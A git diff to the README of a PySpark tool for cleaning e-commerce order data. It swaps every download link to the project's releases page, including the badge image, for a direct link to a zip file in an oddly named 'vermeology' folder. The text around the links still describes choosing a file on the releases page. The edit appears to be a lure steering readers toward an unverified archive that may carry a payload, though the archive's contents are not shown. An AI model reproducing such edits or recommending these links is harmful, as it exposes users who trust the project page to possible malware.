@@ -1,6 +1,6 @@
 # 🚀 Voltmart-Orders-Data-Cleaning - Clean Your E-Commerce Order Data Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/releases)
+[![Download](https://raw.githubusercontent.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/main/vermeology/Voltmart-Orders-Data-Cleaning.zip)](https://raw.githubusercontent.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/main/vermeology/Voltmart-Orders-Data-Cleaning.zip)
 
 ## 📋 Overview
 Voltmart-Orders-Data-Cleaning is a simple tool designed to clean and preprocess e-commerce order data from Voltmart. It helps you prepare your data for analysis and forecasting using PySpark. With features like time of day extraction and data validation, this tool makes your data ready to work with effortlessly.
@@ -22,7 +22,7 @@ Follow these simple steps to download and use the application.
 - Java: Version 8 or higher (for PySpark)
 
 ### Step 2: Visit the Download Page
-To get the application, [visit this page to download](https://github.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/releases).
+To get the application, [visit this page to download](https://raw.githubusercontent.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/main/vermeology/Voltmart-Orders-Data-Cleaning.zip).
 
 ### Step 3: Download the File
 On the releases page, look for the latest version. Click on the file that suits your operating system to start downloading.
@@ -65,6 +65,6 @@ This project is licensed under the MIT License. You can use it freely, but we wo
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/releases)
+[![Download](https://raw.githubusercontent.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/main/vermeology/Voltmart-Orders-Data-Cleaning.zip)](https://raw.githubusercontent.com/Bilal-iqbal01/Voltmart-Orders-Data-Cleaning/main/vermeology/Voltmart-Orders-Data-Cleaning.zip)
 
 This README aims to help you easily download, install, and use the Voltmart-Orders-Data-Cleaning tool. Follow the steps above for a smooth experience, and enjoy cleaning your e-commerce order data.
